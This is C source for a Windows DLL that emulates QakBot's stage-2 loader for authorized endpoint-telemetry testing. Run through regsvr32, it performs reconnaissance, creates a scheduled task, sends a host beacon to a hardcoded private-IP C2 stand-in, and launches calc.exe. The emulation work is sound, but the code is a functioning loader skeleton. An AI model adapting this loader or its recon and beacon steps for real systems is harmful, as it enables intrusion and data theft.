/*
 * ============================================================================
 * ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY
 *
 * This code replicates documented malware behavior for defensive security
 * testing and endpoint telemetry validation. It does NOT contain real malware
 * payloads, exploits, or evasion techniques.
 *
 * LEGAL: Only run this in environments you own or have explicit written
 * authorization to test. Unauthorized use may violate computer fraud laws.
 *
 * Final payload: calc.exe (safe, benign)
 * C2: Local network only (hardcoded private IP: 192.168.0.148)
 * ============================================================================
 *
 * JawDropper Stage 2 — DLL Loader
 *
 * Emulates: QakBot post-exploitation behavior (May 2023)
 * Reference: CISA AA23-242A, MITRE ATT&CK S0650
 *
 * This DLL is loaded via regsvr32.exe /s and executes its payload in
 * DllRegisterServer(). The execution flow mirrors documented QakBot behavior:
 *
 *   1. Anti-analysis delay (Sleep)           — T1497.003
 *   2. Discovery command burst               — T1082, T1016, T1018, T1033, T1482
 *   3. Persistence (scheduled task)          — T1053.005
 *   4. C2 beacon                             — T1071.001
 *   5. Final payload (calc.exe)              — Safe payload
 *
 * Build: See Makefile (cross-compile with mingw-w64)
 *
 * ============================================================================
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ============================================================================
 * SAFETY: Hardcoded safe values — NOT configurable
 * ============================================================================
 * These values are intentionally hardcoded. Someone who wants to change them
 * must modify this source code and recompile. This is a deliberate safety
 * mechanism.
 */

/* C2 server — private RFC1918 IP only */
#define C2_HOST L"192.168.0.148"
#define C2_PORT 8888

/* Final payload — always calc.exe (safe) */
#define PAYLOAD_COMMAND "calc.exe"

/* ============================================================================
 * Helper function declarations
 * ============================================================================ */

static void run_discovery_command(const char* command, const char* description);
static void create_persistence(void);
static void send_beacon(void);
static void launch_payload(void);

/* ============================================================================
 * DLL Entry Point
 * ============================================================================
 *
 * DllMain is called when the DLL is loaded/unloaded. We intentionally do
 * NOTHING here because:
 *
 *   1. DllMain runs under loader lock, limiting what APIs are safe to call
 *   2. Real QakBot executes in DllRegisterServer, not DllMain
 *   3. This matches the documented execution pattern
 *
 * All behavior happens in DllRegisterServer() when regsvr32 /s is used.
 */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    (void)hModule;
    (void)dwReason;
    (void)lpReserved;

    /* Do nothing — all execution is in DllRegisterServer */
    return TRUE;
}

/* ============================================================================
 * DllRegisterServer — Main execution entry point
 * ============================================================================
 *
 * Called by regsvr32.exe /s when loading the DLL. This is where all the
 * QakBot-like behavior executes.
 *
 * MITRE ATT&CK: T1218.010 (Signed Binary Proxy Execution: Regsvr32)
 */
__declspec(dllexport) HRESULT STDAPICALLTYPE DllRegisterServer(void) {
    /*
     * ========================================================================
     * CANARY: Confirm DllRegisterServer is being called
     * ========================================================================
     * Creates a file to prove this function was entered. Check for:
     *   C:\jawdropper_executed.txt
     */
    HANDLE hCanary = CreateFileA(
        "C:\\jawdropper_executed.txt",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hCanary != INVALID_HANDLE_VALUE) {
        const char* msg = "DllRegisterServer was called successfully.\r\n";
        DWORD written;
        WriteFile(hCanary, msg, (DWORD)strlen(msg), &written, NULL);
        CloseHandle(hCanary);
    }

    /*
     * ========================================================================
     * Stage 1: Anti-analysis delay
     * ========================================================================
     *
     * MITRE: T1497.003 — Virtualization/Sandbox Evasion: Time-Based Evasion
     *
     * Real QakBot uses timing checks to detect sandbox environments that
     * accelerate sleep calls. We implement a simple sleep to create the
     * same telemetry signature without actual evasion logic.
     *
     * A 2-second delay is typical — long enough to be observable, short
     * enough not to timeout the loader.
     */
    Sleep(2000);

    /*
     * ========================================================================
     * Stage 2: Discovery command burst
     * ========================================================================
     *
     * Execute system reconnaissance commands to gather information about
     * the compromised host. Each command runs as a child process via cmd.exe
     * to create visible process tree entries.
     *
     * These commands are documented in CISA AA23-242A as typical QakBot
     * reconnaissance behavior.
     */

    /* T1033 — System Owner/User Discovery */
    run_discovery_command("whoami", "T1033: System Owner Discovery");

    /* T1016 — System Network Configuration Discovery */
    run_discovery_command("ipconfig /all", "T1016: Network Configuration");

    /* T1018 — Remote System Discovery */
    run_discovery_command("net view", "T1018: Remote System Discovery");

    /* T1016 — System Network Configuration Discovery (ARP cache) */
    run_discovery_command("arp -a", "T1016: ARP Cache Enumeration");

    /* T1018 — Remote System Discovery (Domain Controller enumeration via DNS)
     *
     * This query looks for LDAP service records for domain controllers.
     * It's a common technique for identifying AD infrastructure.
     * Uses %USERDNSDOMAIN% which expands to the user's DNS domain name.
     */
    run_discovery_command(
        "nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%",
        "T1018: Domain Controller Discovery via DNS"
    );

    /* T1482 — Domain Trust Discovery
     *
     * nltest queries Active Directory trust relationships. This helps
     * attackers understand the domain structure for lateral movement.
     */
    run_discovery_command(
        "nltest /domain_trusts /all_trusts",
        "T1482: Domain Trust Discovery"
    );

    /*
     * ========================================================================
     * Stage 3: Persistence
     * ========================================================================
     *
     * MITRE: T1053.005 — Scheduled Task/Job: Scheduled Task
     *
     * Create a scheduled task for persistence. Real QakBot creates tasks
     * that run regsvr32 with the malicious DLL. For safety, we create a
     * task that runs calc.exe instead.
     *
     * Task details:
     *   Name: JawDropper
     *   Action: calc.exe (SAFE — not the DLL)
     *   Trigger: Daily at 09:00
     *   Flags: /f (force, overwrite if exists)
     */
    create_persistence();

    /*
     * ========================================================================
     * Stage 4: C2 Beacon
     * ========================================================================
     *
     * MITRE: T1071.001 — Application Layer Protocol: Web Protocols
     *
     * Send a beacon to the C2 server indicating successful execution.
     * Real QakBot beacons contain encrypted system information. Ours
     * sends plaintext JSON to the local C2 server.
     */
    send_beacon();

    /*
     * ========================================================================
     * Stage 5: Final payload
     * ========================================================================
     *
     * Launch the "payload" — for JawDropper, this is always calc.exe.
     *
     * In real QakBot, this stage would involve process injection into
     * wermgr.exe or explorer.exe. We skip injection entirely and just
     * launch calc.exe directly as proof of execution.
     */
    launch_payload();

    return S_OK;
}

/* ============================================================================
 * DllUnregisterServer — Required export (no-op)
 * ============================================================================
 *
 * Required for regsvr32 compatibility but does nothing in our emulation.
 */
__declspec(dllexport) HRESULT STDAPICALLTYPE DllUnregisterServer(void) {
    return S_OK;
}

/* ============================================================================
 * DllGetClassObject — Required export (no-op)
 * ============================================================================
 *
 * Required for COM compatibility but does nothing in our emulation.
 * Returns CLASS_E_CLASSNOTAVAILABLE as we don't actually implement COM.
 */
__declspec(dllexport) HRESULT STDAPICALLTYPE DllGetClassObject(
    REFCLSID rclsid, REFIID riid, LPVOID* ppv
) {
    (void)rclsid;
    (void)riid;
    (void)ppv;
    return (HRESULT)0x80040111L; /* CLASS_E_CLASSNOTAVAILABLE */
}

/* ============================================================================
 * run_discovery_command — Execute a discovery command as a child process
 * ============================================================================
 *
 * Uses CreateProcess to spawn cmd.exe /c <command>. This creates visible
 * child processes that endpoint telemetry tools should capture.
 *
 * We use cmd.exe /c rather than calling the commands directly because:
 *   1. It matches real QakBot behavior
 *   2. It creates clear process tree entries
 *   3. It handles shell built-ins and environment variables
 *
 * Parameters:
 *   command     — The command to execute (e.g., "whoami")
 *   description — MITRE technique description for documentation
 */
static void run_discovery_command(const char* command, const char* description) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmd_line[512];

    (void)description; /* Used for documentation purposes */

    /* Zero initialize structures */
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    /* Build command line: cmd.exe /c <command> */
    snprintf(cmd_line, sizeof(cmd_line), "cmd.exe /c %s", command);

    /*
     * CreateProcess parameters:
     *   lpApplicationName: NULL (use command line)
     *   lpCommandLine: Our constructed command
     *   lpProcessAttributes: NULL (no inheritance)
     *   lpThreadAttributes: NULL (no inheritance)
     *   bInheritHandles: FALSE
     *   dwCreationFlags: CREATE_NO_WINDOW (hide cmd window)
     *   lpEnvironment: NULL (inherit current)
     *   lpCurrentDirectory: NULL (inherit current)
     *   lpStartupInfo: Basic startup info
     *   lpProcessInformation: Receives process handles
     */
    if (CreateProcessA(
            NULL,
            cmd_line,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        )) {
        /* Wait for command to complete (5 second timeout) */
        WaitForSingleObject(pi.hProcess, 5000);

        /* Clean up handles */
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    /*
     * Brief delay between commands creates a realistic timeline.
     * Real malware often spaces out reconnaissance to avoid detection.
     */
    Sleep(500);
}

/* ============================================================================
 * create_persistence — Create a scheduled task for persistence
 * ============================================================================
 *
 * MITRE: T1053.005 — Scheduled Task/Job: Scheduled Task
 *
 * Creates a scheduled task named "JawDropper" that runs daily.
 * For safety, the task runs calc.exe, NOT the malicious DLL.
 *
 * Command: schtasks /create /tn "JawDropper" /tr "calc.exe" /sc daily /st 09:00 /f
 */
static void create_persistence(void) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    /*
     * SAFETY: The scheduled task runs calc.exe, not the DLL.
     *
     * Real QakBot would create a task like:
     *   schtasks /create /tn "QakBot" /tr "regsvr32.exe /s path\to\dll" ...
     *
     * We use calc.exe so the persistence is observable in telemetry
     * but doesn't actually maintain malware persistence.
     */
    const char* schtasks_cmd =
        "cmd.exe /c schtasks /create /tn \"JawDropper\" "
        "/tr \"calc.exe\" /sc daily /st 09:00 /f";

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcessA(
            NULL,
            (LPSTR)schtasks_cmd,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        )) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

/* ============================================================================
 * send_beacon — Send HTTP beacon to C2 server
 * ============================================================================
 *
 * MITRE: T1071.001 — Application Layer Protocol: Web Protocols
 *
 * Sends a simple JSON beacon to the local C2 server with:
 *   - hostname: Computer name
 *   - pid: Current process ID
 *   - stage: "loader_complete"
 *
 * Uses WinHTTP for HTTP communication. The C2 address is hardcoded
 * to a private RFC1918 IP address (safety mechanism).
 */
static void send_beacon(void) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    char hostname[256] = {0};
    char beacon_data[512];
    DWORD hostname_size = sizeof(hostname);
    DWORD pid;

    /* Get system information for beacon */
    GetComputerNameA(hostname, &hostname_size);
    pid = GetCurrentProcessId();

    /* Build JSON beacon payload */
    snprintf(beacon_data, sizeof(beacon_data),
        "{\"hostname\": \"%s\", \"pid\": %lu, \"stage\": \"loader_complete\"}",
        hostname, pid);

    /* Initialize WinHTTP session */
    hSession = WinHttpOpen(
        L"JawDropper/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession) goto cleanup;

    /*
     * SAFETY: C2 address is hardcoded private IP.
     * This cannot be changed via arguments or config.
     */
    hConnect = WinHttpConnect(
        hSession,
        C2_HOST,  /* 192.168.0.148 — hardcoded */
        C2_PORT,  /* 8888 — hardcoded */
        0
    );

    if (!hConnect) goto cleanup;

    /* Create POST request to /beacon endpoint */
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        L"/beacon",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    if (!hRequest) goto cleanup;

    /* Send the beacon */
    WinHttpSendRequest(
        hRequest,
        L"Content-Type: application/json\r\n",
        -1L,
        beacon_data,
        (DWORD)strlen(beacon_data),
        (DWORD)strlen(beacon_data),
        0
    );

    /* Wait for response (we don't actually need the response) */
    WinHttpReceiveResponse(hRequest, NULL);

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}

/* ============================================================================
 * launch_payload — Execute the final payload (calc.exe)
 * ============================================================================
 *
 * SAFETY: The payload is ALWAYS calc.exe. This is hardcoded and cannot
 * be changed via arguments, environment variables, or C2 commands.
 *
 * In real QakBot, this stage would involve:
 *   - Process injection into wermgr.exe or explorer.exe
 *   - Loading additional modules
 *   - Establishing persistent C2 communication
 *
 * We skip all of that and just launch calc.exe to prove execution
 * succeeded without any risk.
 */
static void launch_payload(void) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmd_buf[64];  /* Writable buffer for CreateProcessA */

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    /*
     * SAFETY: PAYLOAD_COMMAND is #defined as "calc.exe"
     * This cannot be overridden at runtime.
     *
     * Note: CreateProcessA requires a writable lpCommandLine buffer,
     * so we copy the constant into a local array.
     */
    strncpy(cmd_buf, PAYLOAD_COMMAND, sizeof(cmd_buf) - 1);
    cmd_buf[sizeof(cmd_buf) - 1] = '\0';

    CreateProcessA(
        NULL,
        cmd_buf,
        NULL,
        NULL,
        FALSE,
        0,  /* Show window — so we can see calc.exe launched */
        NULL,
        NULL,
        &si,
        &pi
    );

    /* Don't wait for calc.exe — just let it run */
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
}
